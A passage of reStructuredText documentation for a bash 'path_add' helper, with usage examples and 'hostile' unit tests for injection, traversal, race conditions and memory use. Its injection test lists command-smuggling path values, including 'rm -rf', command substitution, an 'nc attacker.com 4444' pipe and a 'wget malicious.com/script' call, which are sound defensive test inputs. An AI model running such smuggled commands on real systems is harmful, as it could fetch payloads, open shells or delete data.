                   export PATH="$PATH:$new_path"
                   ;;
           esac
       fi
   }

**Examples and Elaboration:**

The ``path_add`` function safely adds directories to PATH, avoiding duplicates and checking for existence.

.. code-block:: bash

   # Add directory to end of PATH
   path_add "/usr/local/bin"
   
   # Add directory to beginning of PATH (higher priority)  
   path_add "/opt/homebrew/bin" before
   
   # Common development setup
   setup_development_path() {
       path_add "$HOME/.local/bin"
       path_add "/opt/homebrew/bin" before
       path_add "$HOME/go/bin"
       path_add "$HOME/.cargo/bin"
   }

**Unit Tests:**

.. code-block:: bash

   # HOSTILE TEST: PATH injection and command substitution attacks
   test_path_add_injection_resistance() {
       local original_path="$PATH"

       # Test various injection attempts
       local injection_attempts=(
           "/usr/bin; rm -rf /tmp/path_attack"
           "/usr/bin\$(touch /tmp/path_exploit)"
           "/usr/bin\`id > /tmp/path_id\`"
           "/usr/bin|nc attacker.com 4444"
           "/usr/bin&wget malicious.com/script"
       )

       for injection in "${injection_attempts[@]}"; do
           path_add "$injection"

           # Verify no commands were executed
           assert_false "[ -f '/tmp/path_attack' ]" "Should not execute rm via injection: $injection"
           assert_false "[ -f '/tmp/path_exploit' ]" "Should not execute touch via command substitution: $injection"
           assert_false "[ -f '/tmp/path_id' ]" "Should not execute id via backticks: $injection"
       done

       export PATH="$original_path"
   }

   # HOSTILE TEST: Path traversal and unauthorized directory access
   test_path_add_path_traversal_resistance() {
       local original_path="$PATH"

       # Create test directories that shouldn't be added
       mkdir -p "/tmp/path_test/../../etc/dangerous"
       mkdir -p "/tmp/path_test/../root/.ssh"

       # Test path traversal attempts
       local traversal_attempts=(
           "/tmp/path_test/../../etc/dangerous"
           "/tmp/path_test/../root/.ssh"
           "../../../usr/bin/malicious"
           "/var/../etc/../root/.bashrc"
           "/tmp/../../../root"
       )

       for traversal in "${traversal_attempts[@]}"; do
           path_add "$traversal"

           # Should not add sensitive system directories
           assert_false "[[ '$PATH' =~ '/etc' ]]" "Should not add /etc to PATH via: $traversal"
           assert_false "[[ '$PATH' =~ '/root' ]]" "Should not add /root to PATH via: $traversal"
       done

       export PATH="$original_path"
       rm -rf "/tmp/path_test"
   }

   # HOSTILE TEST: Concurrent PATH modification race conditions
   test_path_add_race_conditions() {
       local original_path="$PATH"
       local test_base="/tmp/path_race_$$"
       local pids=()

       # Create test directories
       for i in {1..10}; do
           mkdir -p "$test_base/dir_$i"
       done

       # Launch concurrent path_add operations
       for i in {1..10}; do
           (
               path_add "$test_base/dir_$i"
               echo "$PATH" > "/tmp/path_result_$i"
           ) &
           pids+=($!)
       done

       # Wait for all processes
       for pid in "${pids[@]}"; do
           wait "$pid" 2>/dev/null || true
       done

       # Verify PATH integrity after concurrent modifications
       local consistent_count=0
       for i in {1..10}; do
           if [[ -f "/tmp/path_result_$i" ]]; then
               local result_path=$(cat "/tmp/path_result_$i")
               # Each should contain its own directory
               if [[ "$result_path" =~ "dir_$i" ]]; then
                   ((consistent_count++))
               fi
               rm -f "/tmp/path_result_$i"
           fi
       done

       assert_true "(( consistent_count >= 8 ))" "At least 8/10 concurrent PATH additions should succeed (got $consistent_count)"

       export PATH="$original_path"
       rm -rf "$test_base"
   }

   # HOSTILE TEST: PATH pollution and cleanup resistance
   test_path_add_pollution_resistance() {
       local original_path="$PATH"

       # Pollute PATH with various problematic entries
       export PATH="/fake/bin:/malicious/bin:::/empty/path:$PATH"

       # Add legitimate directory
       local test_dir="/tmp/legitimate_bin_$$"
       mkdir -p "$test_dir"

       path_add "$test_dir"

       # Should add legitimate directory despite pollution
       assert_contains "$PATH" "$test_dir" "Should add legitimate directory despite PATH pollution"

       # Should not create duplicate entries
       local occurrences=$(echo "$PATH" | grep -o "$test_dir" | wc -l)
       assert_true "(( occurrences == 1 ))" "Should not create duplicate PATH entries (found $occurrences)"

       export PATH="$original_path"
       rm -rf "$test_dir"
   }

   # HOSTILE TEST: Memory exhaustion with extremely long paths
   test_path_add_memory_exhaustion_resistance() {
       local original_path="$PATH"
       local start_memory=$(ps -o rss= -p $$ 2>/dev/null || echo 0)

       # Create very long path name
       local long_path="/tmp/$(printf 'A%.0s' {1..1000})"
       mkdir -p "$long_path"

       # Add extremely long path multiple times
       for i in {1..50}; do
           path_add "${long_path}_$i" 2>/dev/null || true
       done

       local end_memory=$(ps -o rss= -p $$ 2>/dev/null || echo 0)
       local memory_increase=$((end_memory - start_memory))

       # Should not consume excessive memory
       assert_true "(( memory_increase < 5120 ))" "Should not leak memory with long paths (used ${memory_increase}KB)"

       # PATH should still be functional
       command -v ls >/dev/null 2>&1
       assert_equals $? 0 "PATH should remain functional after stress test"

       export PATH="$original_path"
       rm -rf "/tmp/A"*
   }

Notes
-----

.. note::
   
   All functions are designed to be cross-shell compatible, working in both bash and zsh environments.

.. warning::
   
   Unit tests assume certain system conditions. In production environments, consider using mocks for external dependencies like network connectivity and file system operations.

.. tip::
   
   Functions follow the principle of least surprise - they fail gracefully and provide meaningful error messages when possible.